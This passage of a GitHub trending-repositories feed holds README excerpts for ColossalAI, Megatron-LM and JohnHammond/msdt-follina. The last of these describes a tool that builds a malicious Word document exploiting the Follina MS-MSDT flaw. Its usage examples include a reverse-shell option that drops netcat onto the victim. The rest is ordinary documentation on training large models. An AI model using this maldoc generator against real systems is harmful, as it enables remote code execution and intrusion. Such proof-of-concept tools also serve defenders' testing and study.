align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Quick View&lt;/h2&gt; &#xA;&lt;h3&gt;Start Distributed Training in Lines&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;parallel = dict(&#xA;    pipeline=2,&#xA;    tensor=dict(mode=&#39;2.5d&#39;, depth = 1, size=4)&#xA;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Start Heterogeneous Training in Lines&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;zero = dict(&#xA;    model_config=dict(&#xA;        tensor_placement_policy=&#39;auto&#39;,&#xA;        shard_strategy=TensorShardStrategy(),&#xA;        reuse_fp16_shard=True&#xA;    ),&#xA;    optimizer_config=dict(initial_scale=2**5, gpu_margin_mem_ratio=0.2)&#xA;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h2&gt;Cite Us&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{bian2021colossal,&#xA;  title={Colossal-AI: A Unified Deep Learning System For Large-Scale Parallel Training},&#xA;  author={Bian, Zhengda and Liu, Hongxin and Wang, Boxiang and Huang, Haichen and Li, Yongbin and Wang, Chuanrui and Cui, Fan and You, Yang},&#xA;  journal={arXiv preprint arXiv:2110.14883},&#xA;  year={2021}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/hpcaitech/ColossalAI/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>JohnHammond/msdt-follina</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/JohnHammond/msdt-follina</id>
    <link href="https://github.com/JohnHammond/msdt-follina" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Codebase to generate an msdt-follina payload&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;MS-MSDT &#34;Follina&#34; Attack Vector&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;John Hammond | May 30, 2022&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Create a &#34;Follina&#34; MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/6288722/171033876-dbe73e3e-0a3a-436a-91d8-7fa77a5c1ace.png&#34; alt=&#34;Screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  --command COMMAND, -c COMMAND&#xA;                        command to run on the target (default: calc)&#xA;  --output OUTPUT, -o OUTPUT&#xA;                        output maldoc file (default: ./follina.doc)&#xA;  --interface INTERFACE, -i INTERFACE&#xA;                        network interface or IP address to host the HTTP server (default: eth0)&#xA;  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Examples&lt;/h1&gt; &#xA;&lt;p&gt;Pop &lt;code&gt;calc.exe&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py   &#xA;[+] copied staging doc /tmp/9mcvbrwo&#xA;[+] created maldoc ./follina.doc&#xA;[+] serving html payload on :8000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Pop &lt;code&gt;notepad.exe&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py -c &#34;notepad&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get a reverse shell on port 9001. &lt;strong&gt;Note, this downloads a netcat binary &lt;em&gt;onto the victim&lt;/em&gt; and places it in &lt;code&gt;C:\Windows\Tasks&lt;/code&gt;. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ python3 follina.py -r 9001&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png&#34; alt=&#34;Reverse Shell&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>NVIDIA/Megatron-LM</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/NVIDIA/Megatron-LM</id>
    <link href="https://github.com/NVIDIA/Megatron-LM" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Ongoing research training transformer models at scale&lt;/p&gt;&lt;hr&gt;&lt;p&gt;Megatron (&lt;a href=&#34;https://arxiv.org/pdf/1909.08053.pdf&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/2104.04473.pdf&#34;&gt;2&lt;/a&gt;, and &lt;a href=&#34;https://arxiv.org/pdf/2205.05198&#34;&gt;3&lt;/a&gt;) is a large, powerful transformer developed by the Applied Deep Learning Research team at NVIDIA. This repository is for ongoing research on training large transformer language models at scale. We developed efficient, model-parallel (&lt;a href=&#34;https://arxiv.org/pdf/1909.08053.pdf&#34;&gt;tensor&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/2205.05198&#34;&gt;sequence&lt;/a&gt;, and &lt;a href=&#34;https://arxiv.org/pdf/2104.04473.pdf&#34;&gt;pipeline&lt;/a&gt;), and multi-node pre-training of transformer based models such as &lt;a href=&#34;https://arxiv.org/abs/2005.14165&#34;&gt;GPT&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/pdf/1810.04805.pdf&#34;&gt;BERT&lt;/a&gt;, and &lt;a href=&#34;https://arxiv.org/abs/1910.10683&#34;&gt;T5&lt;/a&gt; using mixed precision.&lt;/p&gt; &#xA;&lt;p&gt;Below are some of the projects where we have directly used Megatron:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/1909.08053.pdf&#34;&gt;BERT and GPT Studies Using Megatron&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.aclweb.org/anthology/2020.emnlp-main.379.pdf&#34;&gt;BioMegatron: Larger Biomedical Domain Language Model&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2101.00408&#34;&gt;End-to-End Training of Neural Retrievers for Open-Domain Question Answering&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.aclweb.org/anthology/2020.acl-main.8.pdf&#34;&gt;Large Scale Multi-Actor Generative Dialog Modeling&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2010.10150&#34;&gt;Local Knowledge Powered Conversational Agents&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.aclweb.org/anthology/2020.emnlp-main.226.pdf&#34;&gt;MEGATRON-CNTRL: Controllable Story Generation with External Knowledge Using Large-Scale Language Models&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.qizhexie.com/data/RACE_leaderboard.html&#34;&gt;RACE Reading Comprehension Dataset Leaderboard&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.aclweb.org/anthology/2020.emnlp-main.468.pdf&#34;&gt;Training Question Answering Models From Synthetic Data&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2112.07868&#34;&gt;Few-shot Instruction Prompts for Pretrained Language Models to Detect Social Biases&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2202.04173&#34;&gt;Exploring the Limits of Domain-Adaptive Training for Detoxifying Large-Scale Language Models&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2201.11990&#34;&gt;Using DeepSpeed and Megatron to Train Megatron-Turing NLG 530B, A Large-Scale Generative Language Model&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2203.08745&#34;&gt;Multi-Stage Prompting for Knowledgeable Dialogue Generation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Megatron is also used in &lt;a href=&#34;https://developer.nvidia.com/nvidia-nemo#nemo-megatron&#34;&gt;NeMo Megatron&lt;/a&gt;, a framework to help enterprises overcome the challenges of building and training sophisticated natural language processing models with billions and trillions of parameters.&lt;/p&gt; &#xA;&lt;p&gt;Our codebase is capable of efficiently training very large (hundreds of billions of parameters) language models with both model and data parallelism. To demonstrate how the code scales with multiple GPUs and model sizes, we consider GPT models from 1 billion all the way to 1 trillion parameters. All models use a vocabulary size of 51,200 and a sequence length of 2048. We vary hidden size, number of attention heads, and number of layers to arrive at a specifc model size. As the model size increases, we also modestly increase the batch size. We leverage &lt;a href=&#34;https://www.top500.org/system/179842/&#34;&gt;NVIDIA&#39;s Selene supercomputer&lt;/a&gt; to perform scaling studies and use up to 3072 &lt;a href=&#34;https://www.nvidia.com/en-us/data-center/a100/&#34;&gt;A100&lt;/a&gt; GPUs for the largest model. Each cluster node has 8 NVIDIA 80GB A100 GPUs. The graph below shows that we scale nearly linear up to 1 trillion parameter models running on 3072 GPUs. Note that these results are from benchmark runs and these models were not trained to convergence; however, the FLOPs are measured for end-to-end training, i.e., includes all operations including data loading, optimization, and even logging.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/images/Achieved_petaFLOPs.png&#34; alt=&#34;Scaling Graph&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The following table shows both model (MFU) and hardware (HFU) FLOPs utilization for select configurations up to 1T parameters (see &lt;a href=&#34;https://arxiv.org/pdf/2205.05198&#34;&gt;our paper&lt;/a&gt; for a description of how these are calculated). As the model size increases, we achieve better GPU utilization and for the one trillion parameter model, we reach a MFU and HFU of 56.3% and 57.0%, respectively. Note that these numbers are also measured on benchmark runs and in this case are measured using a data parallel size of one. Data parallelism introduces some overhead due to the gradient all-reduce required between the data parallel groups. However, for large transformer models, this overhead is not large and can almost entirely eliminted by overlapping the gradient all-reduce with backpropagation.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Model Size&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Model FLOPs Utilization&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Hardware FLOPs Utilization&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;22B&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;41.5%&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;43.7%&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;175B&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;51.4%&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;52.8%&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;530B&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;56.0%&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;57.0%&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;1T&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;56.3%&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;57.0%&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h1&gt;Contents&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#contents&#34;&gt;Contents&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#setup&#34;&gt;Setup&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#downloading-checkpoints&#34;&gt;Downloading Checkpoints&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#training&#34;&gt;Training&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#data-preprocessing&#34;&gt;Data Preprocessing&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#bert-pretraining&#34;&gt;BERT Pretraining&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#gpt-pretraining&#34;&gt;GPT Pretraining&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#t5-pretraining&#34;&gt;T5 Pretraining&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#distributed-pretraining&#34;&gt;Distributed Pretraining&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#gpt-3-example&#34;&gt;GPT-3 Example&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#evaluation-and-tasks&#34;&gt;Evaluation and Tasks&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#gpt-text-generation&#34;&gt;GPT Text Generation&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#gpt-evaluation&#34;&gt;GPT Evaluation&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#wikitext-perplexity-evaluation&#34;&gt;WikiText Perplexity Evaluation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#lambada-cloze-accuracy&#34;&gt;LAMBADA Cloze Accuracy&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#bert-task-evaluation&#34;&gt;BERT Task Evaluation&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#race-evaluation&#34;&gt;RACE Evaluation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#mnli-evaluation&#34;&gt;MNLI Evaluation&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#datasets&#34;&gt;Datasets&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#collecting-wikipedia-training-data&#34;&gt;Collecting Wikipedia Training Data&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/#collecting-gpt-webtext-data&#34;&gt;Collecting GPT Webtext Data&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Setup&lt;/h1&gt; &#xA;&lt;p&gt;We strongly recommend using the latest release of &lt;a href=&#34;https://ngc.nvidia.com/catalog/containers/nvidia:pytorch&#34;&gt;NGC&#39;s PyTorch container&lt;/a&gt;. If you can&#39;t use this for some reason, use the latest pytorch, cuda, nccl, and NVIDIA &lt;a href=&#34;https://github.com/NVIDIA/apex#quick-start&#34;&gt;APEX&lt;/a&gt; releases. Data preprocessing requires &lt;a href=&#34;https://www.nltk.org/install.html&#34;&gt;NLTK&lt;/a&gt;, though this is not required for training, evaluation, or downstream tasks.&lt;/p&gt; &#xA;&lt;h2&gt;Downloading Checkpoints&lt;/h2&gt; &#xA;&lt;p&gt;We have provided pretrained &lt;a href=&#34;https://ngc.nvidia.com/catalog/models/nvidia:megatron_bert_345m&#34;&gt;BERT-345M&lt;/a&gt; and &lt;a href=&#34;https://ngc.nvidia.com/catalog/models/nvidia:megatron_lm_345m&#34;&gt;GPT-345M&lt;/a&gt; checkpoints for use to evaluate or finetuning downstream tasks. To access these checkpoints, first &lt;a href=&#34;https://ngc.nvidia.com/signup&#34;&gt;sign up&lt;/a&gt; for and &lt;a href=&#34;https://ngc.nvidia.com/setup/installers/cli&#34;&gt;setup&lt;/a&gt; the NVIDIA GPU Cloud (NGC) Registry CLI. Further documentation for downloading models can be found in the &lt;a href=&#34;https://docs.nvidia.com/dgx/ngc-registry-cli-user-guide/index.html#topic_6_4_1&#34;&gt;NGC documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Alternatively, you can directly download the checkpoints using:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;BERT-345M-uncased: wget --content-disposition https://api.ngc.nvidia.com/v2/models/nvidia/megatron_bert_345m/versions/v0.1_uncased/zip -O megatron_bert_345m_v0.1_uncased.zip&#xA;BERT-345M-cased: wget --content-disposition https://api.ngc.nvidia.com/v2/models/nvidia/megatron_bert_345m/versions/v0.1_cased/zip -O megatron_bert_345m_v0.1_cased.zip&#xA;GPT-345M: wget --content-disposition https://api.ngc.nvidia.com/v2/models/nvidia/megatron_lm_345m/versions/v0.0/zip -O megatron_lm_345m_v0.0.zip&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;The models require vocabulary files to run. The BERT WordPiece vocab file can be extracted from Google&#39;s pretrained BERT models: &lt;a href=&#34;https://s3.amazonaws.com/models.huggingface.co/bert/bert-large-uncased-vocab.txt&#34;&gt;uncased&lt;/a&gt;, &lt;a href=&#34;https://s3.amazonaws.com/models.huggingface.co/bert/bert-large-cased-vocab.txt&#34;&gt;cased&lt;/a&gt;. The GPT &lt;a href=&#34;https://s3.amazonaws.com/models.huggingface.co/bert/gpt2-vocab.json&#34;&gt;vocab file&lt;/a&gt; and &lt;a href=&#34;https://s3.amazonaws.com/models.huggingface.co/bert/gpt2-merges.txt&#34;&gt;merge table&lt;/a&gt; can be downloaded directly.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;After installation, there are several possible workflows. The most comprehensive is:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Data preprocessing&lt;/li&gt; &#xA; &lt;li&gt;Pretraining&lt;/li&gt; &#xA; &lt;li&gt;Finetuning (Optional for zero-shot tasks)&lt;/li&gt; &#xA; &lt;li&gt;Downstream task evaluation or text generation&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;However, steps 1 and 2 can be replaced by using one of the pretrained models mentioned above.&lt;/p&gt; &#xA;&lt;p&gt;We&#39;ve provided several scripts for pretraining both BERT and GPT in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/examples&#34;&gt;&lt;code&gt;examples&lt;/code&gt;&lt;/a&gt; directory, as well as scripts for both zero-shot and fine-tuned downstream tasks including MNLI, RACE, WikiText103, and LAMBADA evaluation. There is also a script for GPT interactive text generation.&lt;/p&gt; &#xA;&lt;h1&gt;Training&lt;/h1&gt; &#xA;&lt;h2&gt;Data Preprocessing&lt;/h2&gt; &#xA;&lt;p&gt;The training data requires preprocessing. First, place your training data in a loose json format, with one json containing a text sample per line. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;{&#34;src&#34;: &#34;www.nvidia.com&#34;, &#34;text&#34;: &#34;The quick brown fox&#34;, &#34;type&#34;: &#34;Eng&#34;, &#34;id&#34;: &#34;0&#34;, &#34;title&#34;: &#34;First Part&#34;}&#xA;{&#34;src&#34;: &#34;The Internet&#34;, &#34;text&#34;: &#34;jumps over the lazy dog&#34;, &#34;type&#34;: &#34;Eng&#34;, &#34;id&#34;: &#34;42&#34;, &#34;title&#34;: &#34;Second Part&#34;}&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;The name of the &lt;code&gt;text&lt;/code&gt; field of the json can be changed by using the &lt;code&gt;--json-key&lt;/code&gt; flag in &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/tools/preprocess_data.py&#34;&gt;&lt;code&gt;preprocess_data.py&lt;/code&gt;&lt;/a&gt; The other metadata are optional and are not used in training.&lt;/p&gt; &#xA;&lt;p&gt;The loose json is then processed into a binary format for training. To convert the json into mmap, cached index file, or the lazy loader format use &lt;code&gt;preprocess_data.py&lt;/code&gt;. Set the &lt;code&gt;--dataset-impl&lt;/code&gt; flag to &lt;code&gt;mmap&lt;/code&gt;, &lt;code&gt;cached&lt;/code&gt;, or &lt;code&gt;lazy&lt;/code&gt;, respectively (default is &lt;code&gt;mmap&lt;/code&gt;). An example script to prepare data for BERT training is:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;python tools/preprocess_data.py \&#xA;       --input my-corpus.json \&#xA;       --output-prefix my-bert \&#xA;       --vocab bert-vocab.txt \&#xA;       --dataset-impl mmap \&#xA;       --tokenizer-type BertWordPieceLowerCase \&#xA;       --split-sentences&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;The output will be two files named, in this case, &lt;code&gt;my-bert_text_sentence.bin&lt;/code&gt; and &lt;code&gt;my-bert_text_sentence.idx&lt;/code&gt;. The &lt;code&gt;--data-path&lt;/code&gt; specified in later BERT training is the full path and new filename, but without the file extension.&lt;/p&gt; &#xA;&lt;p&gt;For T5 use the same preprocessing as BERT, perhaps renaming it to:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;       --output-prefix my-t5 \&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Some minor modifications are required for GPT data preprocessing, namely, the addition of a merge table, an end-of-document token, removal of sentence splitting, and a change to the tokenizer type:&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;python tools/preprocess_data.py \&#xA;       --input my-corpus.json \&#xA;       --output-prefix my-gpt2 \&#xA;       --vocab gpt2-vocab.json \&#xA;       --dataset-impl mmap \&#xA;       --tokenizer-type GPT2BPETokenizer \&#xA;       --merge-file gpt2-merges.txt \&#xA;       --append-eod&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Here the output files are named &lt;code&gt;my-gpt2_text_document.bin&lt;/code&gt; and &lt;code&gt;my-gpt2_text_document.idx&lt;/code&gt;. As before, in GPT training, use the longer name without the extension as &lt;code&gt;--data-path&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Further command line arguments are described in the source file &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/tools/preprocess_data.py&#34;&gt;&lt;code&gt;preprocess_data.py&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;BERT Pretraining&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;examples/pretrain_bert.sh&lt;/code&gt; script runs single GPU 345M parameter BERT pretraining. Debugging is the primary use for single GPU training, as the code base and command line arguments are optimized for highly distributed training. Most of the arguments are fairly self-explanatory. By default, the learning rate decays linearly over the training iterations starting at &lt;code&gt;--lr&lt;/code&gt; to a minimum set by &lt;code&gt;--min-lr&lt;/code&gt; over &lt;code&gt;--lr-decay-iters&lt;/code&gt; iterations. The fraction of training iterations used for warmup is set by &lt;code&gt;--lr-warmup-fraction&lt;/code&gt;. While this is single GPU training, the batch size specified by &lt;code&gt;--micro-batch-size&lt;/code&gt; is a single forward-backward path batch-size and the code will perform gradient accumulation steps until it reaches &lt;code&gt;global-batch-size&lt;/code&gt; which is the batch size per iteration. The data is partitioned into a 949:50:1 ratio for training/validation/test sets (default is 969:30:1). This partitioning happens on the fly, but is consistent across runs with the same random seed (1234 by default, or specified manually with &lt;code&gt;--seed&lt;/code&gt;). We use &lt;code&gt;train-iters&lt;/code&gt; as the training iterations requested. Alternatively, one can provide &lt;code&gt;--train-samples&lt;/code&gt; which is total number of samples to train on. If this option is present, then instead of providing &lt;code&gt;--lr-decay-iters&lt;/code&gt;, one will need to provide &lt;code&gt;--lr-decay-samples&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The logging, checkpoint-saving, and evaluation intervals are specified. Checkpointing the activations facilitates the training of larger models and/or batches. Note that the &lt;code&gt;--data-path&lt;/code&gt; now includes the additional &lt;code&gt;_text_sentence&lt;/code&gt; suffix added in preprocessing, but does not include the file extensions.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;CHECKPOINT_PATH=checkpoints/bert_345m&#xA;VOCAB_FILE=bert-vocab.txt&#xA;DATA_PATH=my-bert_text_sentence&#xA;&#xA;BERT_ARGS=&#34;--num-layers 24 \&#xA;           --hidden-size 1024 \&#xA;           --num-attention-heads 16 \&#xA;           --seq-length 512 \&#xA;           --max-position-embeddings 512 \&#xA;           --lr 0.0001 \&#xA;           --lr-decay-iters 990000 \&#xA;           --train-iters 2000000 \&#xA;           --min-lr 0.00001 \&#xA;           --lr-warmup-fraction 0.01 \&#xA;&#x9;   --micro-batch-size 4 \&#xA;           --global-batch-size 8 \&#xA;           --vocab-file $VOCAB_FILE \&#xA;           --split 949,50,1 \&#xA;           --fp16&#34;&#xA;&#xA;OUTPUT_ARGS=&#34;--log-interval 10 \&#xA;             --save-interval 500 \&#xA;             --eval-interval 100 \&#xA;             --eval-iters 10 \&#xA;             --activations-checkpoint-method uniform&#34;&#xA;&#xA;python pretrain_bert.py \&#xA;       $BERT_ARGS \&#xA;       $OUTPUT_ARGS \&#xA;       --save $CHECKPOINT_PATH \&#xA;       --load $CHECKPOINT_PATH \&#xA;       --data-path $DATA_PATH&#xA;&lt;/pre&gt; &#xA;&lt;p&gt;Further command line arguments are described in the source file &lt;a href=&#34;https://raw.githubusercontent.com/NVIDIA/Megatron-LM/main/megatron/arguments.py&#34;&gt;&lt;code&gt;arguments.py&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;GPT Pretraining&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;examples/pretrain_gpt.sh&lt;/code&gt; script runs single GPU 345M parameter GPT pretraining. As mentioned above, single GPU training is primarily intended for debugging purposes, as the code is optimized for distributed training.&lt;/p&gt; &#xA;&lt;p&gt;It follows largely the same format as the previous BERT script with a few notable differences: the tokenization scheme used is BPE (which requires a merge table and a &lt;code&gt;json&lt;/code&gt; vocabulary file) instead of WordPiece, the model architecture allows for longer sequences (note that the max position embedding must be greater than or equal to the maximum sequence length), and the &lt;code&gt;--lr-decay-style&lt;/code&gt; has been set to cosine decay. Note that the &lt;code&gt;--data-path&lt;/code&gt; now includes the additional &lt;code&gt;_text_document&lt;/code&gt; suffix added in preprocessing, but does not include the file extensions.&lt;/p&gt; &#xA;&lt;pre&gt;&#xA;CHECKPOINT_PATH=checkpoints/gpt2_345m&#xA;VOCAB_FILE=gpt2-vocab.json&#xA;MERGE_FILE=gpt2-merges.txt&#xA;DATA_PATH=my-gpt2_text_document&#xA;&#xA;GPT_ARGS=&#34;--num-layers 24 \&#xA;          --hidden-size 1024 \&#xA;          --num-attention-heads 16 \&#xA;          --seq-length 1024 \&#xA;          --max-position-embeddings 1024 \&#xA;          --micro-batch-size 